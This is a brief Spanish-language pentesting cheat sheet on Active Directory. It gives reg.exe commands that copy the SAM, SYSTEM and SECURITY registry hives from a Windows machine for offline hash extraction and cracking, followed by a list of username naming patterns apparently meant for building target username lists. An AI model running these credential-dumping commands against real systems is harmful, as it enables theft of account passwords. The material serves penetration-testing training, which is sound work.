# Directorio Activo
## Descripción
Pentesting Directorio Activo , comandos

### SAM - SYSTEM - SECURITY
Hay tres colmenas de registro que podemos copiar si tenemos acceso de administrador local en el destino; cada uno tendrá un propósito específico cuando lleguemos a desechar y descifrar los hashes. Lo siguiente se hace desde el equipo windows con permisos de administrador en una consola cmd.

```python
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
- **firstinitiallastname:** jdoe
- **firstinitialmiddleinitiallastname:** jjdoe
- **firstnamelastname:** janedoe
- **firstname.lastname:** jane.doe
- **lastname.firstname:** doe.jane
- **nickname:** doedoehacksstuff
